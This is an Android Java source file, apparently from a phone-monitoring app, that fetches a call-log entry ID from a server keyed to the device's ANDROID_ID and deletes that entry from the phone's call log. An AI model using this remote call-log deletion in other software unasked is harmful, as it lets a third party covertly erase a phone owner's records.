package com.hinj.asynctask;

/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */

import android.content.Context;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.provider.CallLog;
import android.provider.Settings.Secure;

import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.Utility;
import com.hinj.parsing.HingAppParsing;
import com.hinj.secure.smsgps.DeviceInterface;

public class DeleteCallLogAsyncTask extends AsyncTask<String, Void, String> {
	
	private static final String TAG = "GetCallLogIdAsyncTask";
	private Context ctx;
	private RequestPost mRequestPostClass;
	private DeviceInterface onComplete;	
	private String clip_board_string;
	private Handler handler;
	
	/**
	 * 
	 */
	public DeleteCallLogAsyncTask(final Context ctx, DeviceInterface onComplete) {
		this.ctx=ctx;
		this.onComplete=onComplete;

	}
	
	@Override
	public void onPreExecute() {
	}

	@Override
	protected final String doInBackground(String... params) {
		try{
			getCallLogDeleteId();
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			onComplete.onCompletedGetCallLogId();
		}
		
		return null;
	}

	@Override
	public void onPostExecute(String serverResponse) {

	}
	
	private void getCallLogDeleteId() {
		
	   if (Utility.isNetworkAvailable(ctx)) {
		//new YourAsyncTask_ContactList().execute(CallDetailList, ""+ total);
		new GetCallLogDeleteIdAsyncTask().execute();
	   }
	}
	
	public class GetCallLogDeleteIdAsyncTask extends AsyncTask<String, String,Object[]> {
		
		String response = "";
		String upload_device_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
		
		public GetCallLogDeleteIdAsyncTask() {
		}

		@Override
		public void onPreExecute() {
		}

		@Override
		public Object[] doInBackground(String... params) {
			
			return HingAppParsing.getdeleteCallLogId(ctx,upload_device_id); 
		}  
 
		@Override
		public void onPostExecute(Object[] result) {
			try{
				System.out.println("result "+result);
				boolean status = (Boolean) result[0];
				response = (String) result[1];
				
				if(status)
				{
					DeleteNumFromCallLog(ctx, HinjAppPreferenceUtils.getCallLogDeleteId(ctx));
				}
			}
			catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
	public void DeleteNumFromCallLog(Context ctx, String strNum)
	{
		try
		{
			String strUriCalls = "content://call_log/calls";
		    Uri UriCalls = Uri.parse(strUriCalls);
		    //Cursor c = res.query(UriCalls, null, null, null, null);
		    if(null != ctx.getContentResolver())
		    {
		    	ctx.getContentResolver().delete(UriCalls,CallLog.Calls._ID +"=?",new String[]{ strNum});
		    	HinjAppPreferenceUtils.setCallLogDeleteId(ctx, "");
		    }
		}
		catch(Exception e) 
		{ 
			e.getMessage(); 
		} 
	}
	
}
